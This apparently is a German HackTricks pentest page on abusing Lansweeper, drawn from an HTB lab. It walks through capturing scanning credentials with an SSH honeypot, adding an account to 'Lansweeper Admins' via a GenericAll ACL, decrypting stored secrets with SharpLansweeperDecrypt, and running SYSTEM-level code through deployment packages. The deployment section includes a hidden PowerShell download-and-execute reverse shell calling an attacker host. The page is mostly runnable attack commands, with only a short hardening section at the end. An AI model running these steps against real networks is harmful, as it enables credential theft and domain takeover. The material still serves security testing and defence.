# Lansweeper-Missbrauch: Credential Harvesting, Secrets Decryption und RCE über Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ist eine Plattform zur Erkennung und Inventarisierung von IT-Assets, die häufig unter Windows eingesetzt und in Active Directory integriert wird. In Lansweeper konfigurierte Credentials werden von den Scanning Engines verwendet, um sich über Protokolle wie SSH, SMB/WMI und WinRM bei Assets zu authentifizieren. Fehlkonfigurationen ermöglichen häufig:

- das Abfangen von Credentials, indem ein Scanning-Ziel auf einen vom Angreifer kontrollierten Host (Honeypot) umgeleitet wird
- den Missbrauch von AD-ACLs, die durch Lansweeper-bezogene Gruppen offengelegt werden, um Remotezugriff zu erlangen
- die Entschlüsselung von in Lansweeper konfigurierten Secrets auf dem Host (Connection Strings und gespeicherte Scanning Credentials)
- Codeausführung auf verwalteten Endpunkten über die Deployment-Funktion (die häufig als SYSTEM ausgeführt wird)

Diese Seite fasst praktische Angreifer-Workflows und Befehle zusammen, um dieses Verhalten während Engagements auszunutzen.

## 1) Scanning Credentials über einen Honeypot abgreifen (SSH-Beispiel)

Idee: Erstelle ein Scanning Target, das auf deinen Host zeigt, und ordne ihm vorhandene Scanning Credentials zu. Wenn der Scan ausgeführt wird, versucht Lansweeper, sich mit diesen Credentials zu authentifizieren, und dein Honeypot fängt sie ab.<sup>[[1]](#references)</sup>

Übersicht der Schritte (Web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (oder Single IP) = deine VPN-IP
- Konfiguriere den SSH-Port auf einen erreichbaren Port (z. B. 2022, falls 22 blockiert ist)
- Deaktiviere den Zeitplan und plane, den Scan manuell auszulösen
- Scanning → Scanning Credentials → stelle sicher, dass Linux/SSH-Credentials vorhanden sind; ordne sie dem neuen Target zu (aktiviere bei Bedarf alle)
- Klicke beim Target auf „Scan now“
- Führe einen SSH-Honeypot aus und ermittle den versuchten Username/das versuchte Passwort

Beispiel mit sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Erfasste Zugangsdaten gegen DC-Dienste validieren:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notizen
- Funktioniert ähnlich für andere Protokolle, wenn du den Scanner zu deinem Listener zwingen kannst (SMB/WinRM honeypots usw.). SSH ist häufig am einfachsten.
- Viele Scanner identifizieren sich mit eindeutigen Client-Bannern (z. B. RebexSSH) und versuchen harmlose Befehle auszuführen (uname, whoami usw.).

## 2) AD ACL abuse: Remote-Zugriff erlangen, indem du dich zu einer app-admin group hinzufügst

Verwende BloodHound, um die effektiven Berechtigungen des kompromittierten Kontos zu enumerieren. Ein häufiger Fund ist eine scanner- oder app-spezifische Gruppe (z. B. „Lansweeper Discovery“), die GenericAll über eine privilegierte Gruppe (z. B. „Lansweeper Admins“) besitzt. Wenn die privilegierte Gruppe außerdem Mitglied von „Remote Management Users“ ist, wird WinRM verfügbar, sobald wir uns selbst hinzufügen.<sup>[[1]](#references)[[5]](#references)</sup>

Sammlungsbeispiele:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit von GenericAll bei einer Gruppe mit BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dann erhalten Sie eine interaktive Shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Hinweis: Kerberos-Operationen sind zeitkritisch. Wenn KRB_AP_ERR_SKEW auftritt, synchronisiere dich zuerst mit dem DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Lansweeper-konfigurierte Secrets auf dem Host entschlüsseln

Auf dem Lansweeper-Server speichert die ASP.NET-Site typischerweise eine verschlüsselte connection string und einen vom Application verwendeten symmetrischen Schlüssel. Mit entsprechendem lokalem Zugriff können Sie die DB connection string entschlüsseln und anschließend gespeicherte Scan-Anmeldedaten extrahieren.<sup>[[1]](#references)</sup>

Typische Speicherorte:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Verwenden Sie SharpLansweeperDecrypt, um die Entschlüsselung und das Ausgeben der gespeicherten Anmeldedaten zu automatisieren:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Die erwartete Ausgabe umfasst DB-Verbindungsdetails und Klartext-Scan-Anmeldedaten wie Windows- und Linux-Konten, die in der gesamten Umgebung verwendet werden. Diese verfügen auf Domänenhosts häufig über erweiterte lokale Rechte:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Verwende wiederhergestellte Windows-Scanning-Credentials für privilegierten Zugriff:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Als Mitglied der Gruppe „Lansweeper Admins“ zeigt die Weboberfläche die Bereiche Deployment und Configuration an. Unter Deployment → Deployment packages können Sie Pakete erstellen, die beliebige Befehle auf den ausgewählten Assets ausführen. Die Ausführung erfolgt durch den Lansweeper-Dienst mit hohen Berechtigungen, wodurch Code Execution als NT AUTHORITY\SYSTEM auf dem ausgewählten Host möglich ist.<sup>[[1]](#references)</sup>

Übergeordnete Schritte:
- Erstellen Sie ein neues Deployment package, das einen PowerShell- oder cmd-One-Liner ausführt (Reverse Shell, Benutzer hinzufügen usw.).
- Wählen Sie das gewünschte Asset als Ziel (z. B. den DC/Host, auf dem Lansweeper ausgeführt wird), und klicken Sie auf Deploy/Run now.
- Empfangen Sie Ihre Shell als SYSTEM.

Beispiel-Payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment-Aktionen sind auffällig und hinterlassen Logs in Lansweeper und den Windows-Ereignisprotokollen. Mit Bedacht einsetzen.

## Erkennung und Hardening

- Anonyme SMB-Enumerations einschränken oder entfernen. Auf RID cycling und anomalen Zugriff auf Lansweeper-Shares überwachen.
- Egress-Kontrollen: Ausgehendes SSH/SMB/WinRM von Scanner-Hosts blockieren oder stark einschränken. Bei nicht standardmäßigen Ports (z. B. 2022) und ungewöhnlichen Client-Bannern wie Rebex alarmieren.
- `Website\\web.config` und `Key\\Encryption.txt` schützen. Secrets in einen Vault auslagern und bei einer Offenlegung rotieren. Service-Accounts mit minimalen Berechtigungen sowie gMSA in Betracht ziehen, sofern möglich.
- AD-Überwachung: Bei Änderungen an Lansweeper-bezogenen Gruppen (z. B. „Lansweeper Admins“, „Remote Management Users“) sowie bei ACL-Änderungen alarmieren, die GenericAll/Write-Mitgliedschaften für privilegierte Gruppen gewähren.
- Erstellung, Änderungen und Ausführung von Deployment-Paketen auditieren; bei Paketen alarmieren, die cmd.exe/powershell.exe starten oder unerwartete ausgehende Verbindungen aufbauen.

## Verwandte Themen
- SMB/LSA/SAMR-Enumeration und RID cycling
- Kerberos password spraying und Überlegungen zu clock skew
- BloodHound-Pfadanalyse von Application-Admin-Gruppen
- WinRM-Nutzung und laterale Bewegungen

## Referenzen
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
